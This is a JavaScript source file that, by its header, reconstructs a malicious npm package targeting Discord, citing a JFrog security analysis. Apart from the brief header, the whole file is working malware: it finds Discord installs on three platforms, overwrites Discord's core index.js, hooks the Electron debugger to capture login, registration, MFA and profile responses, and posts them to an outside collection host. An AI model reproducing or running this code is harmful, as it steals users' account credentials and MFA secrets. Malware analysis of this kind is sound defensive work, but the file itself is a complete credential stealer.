// discord-electron-inject — reconstructed from public security analyses
// Source: https://research.jfrog.com/post/duer-js-malicious-package/
//
// Injects into Discord's Electron environment by overwriting Discord's
// index.js. Uses webContents.debugger.attach to hook network stack
// for credential interception (login, MFA, profile changes).
//
// Technique: Electron injection + debugger protocol + credential interception

const fs = require("fs");
const path = require("path");
const os = require("os");
const https = require("https");

// Find Discord installation
function findDiscord() {
  var home = os.homedir();
  var possiblePaths = [];

  if (os.platform() === "win32") {
    possiblePaths = [
      path.join(home, "AppData", "Local", "Discord"),
      path.join(home, "AppData", "Local", "DiscordCanary"),
      path.join(home, "AppData", "Local", "DiscordPTB")
    ];
  } else if (os.platform() === "darwin") {
    possiblePaths = [
      path.join(home, "Library", "Application Support", "Discord"),
      path.join(home, "Library", "Application Support", "discord")
    ];
  } else {
    possiblePaths = [
      path.join(home, ".config", "discord"),
      path.join(home, ".config", "discordcanary")
    ];
  }

  for (var i = 0; i < possiblePaths.length; i++) {
    if (fs.existsSync(possiblePaths[i])) {
      return possiblePaths[i];
    }
  }
  return null;
}

// Find the core module index.js
function findCoreIndex(discordPath) {
  try {
    var entries = fs.readdirSync(discordPath);
    for (var i = 0; i < entries.length; i++) {
      if (entries[i].startsWith("app-")) {
        var corePath = path.join(discordPath, entries[i], "modules", "discord_desktop_core-1", "discord_desktop_core", "index.js");
        if (fs.existsSync(corePath)) return corePath;
        // Try alternative path
        corePath = path.join(discordPath, entries[i], "modules", "discord_desktop_core", "index.js");
        if (fs.existsSync(corePath)) return corePath;
      }
    }
  } catch(e) {}
  return null;
}

// Injected payload that hooks into Discord's network stack
var injectedPayload = [
  "// Injected debugger hook",
  "module.exports = require('./core.asar');",
  "const { BrowserWindow } = require('electron');",
  "const https = require('https');",
  "",
  "function hook(win) {",
  "  try {",
  "    win.webContents.debugger.attach('1.3');",
  "    win.webContents.debugger.on('message', function(e, method, params) {",
  "      if (method === 'Network.responseReceived') {",
  "        var url = params.response.url;",
  "        if (url.includes('/login') || url.includes('/register') || url.includes('/mfa/totp') || url.includes('/@me')) {",
  "          win.webContents.debugger.sendCommand('Network.getResponseBody', { requestId: params.requestId }, function(err, result) {",
  "            if (!err && result.body) {",
  "              send(url, result.body);",
  "            }",
  "          });",
  "        }",
  "      }",
  "    });",
  "    win.webContents.debugger.sendCommand('Network.enable');",
  "  } catch(e) {}",
  "}",
  "",
  "function send(url, body) {",
  "  var payload = JSON.stringify({ url: url, data: body });",
  "  var req = https.request({",
  "    hostname: 'bada-stealer.com',",
  "    path: '/collect',",
  "    method: 'POST',",
  "    headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(payload) }",
  "  });",
  "  req.write(payload);",
  "  req.end();",
  "}",
  "",
  "BrowserWindow.getAllWindows().forEach(hook);",
].join("\n");

// Inject into Discord
var discordPath = findDiscord();
if (discordPath) {
  var corePath = findCoreIndex(discordPath);
  if (corePath) {
    try {
      fs.writeFileSync(corePath, injectedPayload);
    } catch(e) {}
  }
}
